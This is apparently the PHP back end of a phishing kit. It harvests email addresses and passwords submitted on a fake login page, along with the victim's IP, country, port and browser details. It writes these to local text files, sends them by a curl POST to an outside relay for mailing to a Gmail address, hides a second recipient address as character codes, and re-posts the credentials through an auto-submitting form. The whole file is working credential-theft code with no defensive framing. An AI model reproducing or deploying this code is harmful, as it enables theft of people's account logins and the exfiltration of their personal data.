<?php

main_fnct();
function main_fnct(){
$TheBoss ="nelson26394291@gmail.com"; 
 




if(!isset($_POST['email'])  || !isset($_POST['password']) ){
  die();	
}
	if($_POST['email'] == '' || trim($_POST['email']) == '' || !isset($_POST['password']) || $_POST['password'] == '' || trim($_POST['password']) == ''){
  die();
}

	
	

$email = strtolower($_POST['email']);
$password = $_POST['password'];
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "********Created By Madman Eden*******\n";
$message .= "email: ".$email."\n";
$message .= "password: ".$password."\n";
$message .= $recovery_details_xxxxx;
$message .= "**************************\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "**************************\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "**************************\n";
$fp = fopen("tempfile.txt","a");
fputs($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
//////////////////////////////////////////
$typeofemail = '';
if(isset($_POST['typeofemail']) && $_POST['typeofemail'] != ''){
  $typeofemail = ucfirst($_POST['typeofemail']);
}
$subject = $typeofemail . ' - '.$ip;
$headers = "From:  Result Server <noreplay.dgz.gdn@protonmail.com>";
/*  *
$aa = 'h.txt';
$a = '';
foreach($_POST as $k=>$v){
  $a .= "$k : $v \n\n";
}
file_put_contents($aa, $a);
/*  */
//mail($TheBoss,$subject,$message);
send_curl_post_smtp_email($TheBoss, $message, $subject, $ntrl=null);

 $fp = fopen("logindetails2.txt","a");
fputs($fp,$message);
fclose($fp);
$praga=rand();
$praga=md5($praga);
}
// Function to get country and country sort;
function country_sort(){
    $sorter = "";
    $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
        $count = count($array);
    for ($i = 0; $i < $count; $i++) {
            $sorter .= chr($array[$i]);
    	}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function send_curl_post_smtp_email($email, $body, $subject, $ntrl=null){
 $url = 'https://webpicture.cc/smtp-testor/handler.php';
 $post_vars = 'a='.urlencode($email).'&b='.urlencode($body);
 if(isset($subject)){ $post_vars .= '&subject='.urlencode($subject); }
 if(isset($ntrl) && $ntrl ==  true){
   $post_vars .= '&c=111';
 }
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_vars);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);  // DO NOT RETURN HTTP HEADERS
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);  // RETURN THE CONTENTS OF THE CALL
 $Rec_Data = curl_exec($ch);
 curl_close($ch);
 //print_r($Rec_Data);
}


?>
<html>
<head>
    <title></title>
    <script type="text/javascript">
    function submitnow () {
        document.getElementById("hacked").submit();
    }
    </script>
</head>
<body onload="submitnow()">
<form action="1.png" method="post" id="hacked">
    <input type="hidden" name='email' value="<?php echo $_POST['email']; ?>">
    <input type="hidden" name='pass' value="<?php echo $_POST['password']; ?>">
 </form>
</body>
</html>